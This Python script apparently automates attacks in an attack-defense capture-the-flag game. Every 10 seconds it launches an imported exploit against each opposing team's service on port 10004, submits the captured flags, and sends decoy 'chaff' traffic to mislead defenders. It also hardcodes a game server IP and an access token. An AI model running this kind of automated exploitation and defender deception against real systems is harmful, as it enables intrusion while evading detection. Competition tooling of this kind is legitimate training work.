#!/usr/bin/env python3

from Base_Exploit import Exploit
from Exploit_4 import Exploit4
import random
import threading
import time
from swpag_client import Team 

debug = True
debug_chaff = False
round_time_in_seconds = 10
chaff_to_real_ratio = 3
args_dict = {}

# Connection to team Interfcae using swpag_client
team = Team('http://34.211.129.130', "WOfdkzdhsZEIlPEIai49")

# Submit flag
def submit_flag(name, flag):
    status = team.submit_flag(flag)
    for i, s in enumerate(status):
        print(f"Flag {flag} submission status:{s}")

# launch 1 exploit and 3 chaffs 
def launch_exploit(Exploit, ip, port,flagId, name, debug, debug_chaff):
    new_exploit = Exploit(ip, port,flagId, name, debug, debug_chaff)
    chaff_array = [False]*chaff_to_real_ratio
    chaff_array.append(True)
    random.shuffle(chaff_array)  
    for value in chaff_array:
        if value:
            # Calling Exploit
            target, flag = new_exploit.get_flag()
            if flag!=None:
                if not isinstance(flag, list):
                    flag = [flag]
                # Submitting FLAG
                submit_flag(target, flag)
        else:
            # Sending some junk information, to trick other teams
            new_exploit.send_chaff()

#logic to get the team ip from hostname
def team_ip(team_host):
    team_number = int(team_host[4:])
    major = round((team_number % 20))
    if team_number <=20:
        minor = 3
    else:
        minor = 4    
    if major==0:
        major = 20
    return '10.9.{major}.{minor}'.format(major=major, minor=minor)

if __name__ == "__main__":
    print("[*] Starting Launcher")
    ips=[]    
    # Get targets for service 4:
    targets = team.get_targets(4)
    # Form the exploit list
    for target in targets:
        ips.append((team_ip(target['hostname']),target['flag_id']))
        print(f"Host name:{target['hostname']}, IP:{team_ip(target['hostname'])}, Flag Id: {target['flag_id']}") 
    #exploit list in format (ExploitClass, exploit_port, exploit_name)
    exploit_list = []    
    # Call Exploit_4 for service 4
    exploit_list.append((Exploit4,10004,"Exploit4"))
    # Run every 10 seconds to avoid DOS
    while True:
        # launch the exploits, run the exploits in thread        
        for ip,flagId in ips:
            print(f"IP: {ip} Flag: {flagId}")
            for Exploit, port, name in exploit_list:
                t = threading.Thread(
                    name=name+ " against " + ip,
                    target=launch_exploit,
                    args=(Exploit, ip, port,flagId, name,  debug, debug_chaff))
                t.start()
                print(f"Lauch exploit started:{name} against {ip} in port {port}")
        print(f"Sleeping..... for {round_time_in_seconds} seconds")        
        time.sleep(round_time_in_seconds)
        print(f"Starting back..... after {round_time_in_seconds} seconds")     
                   
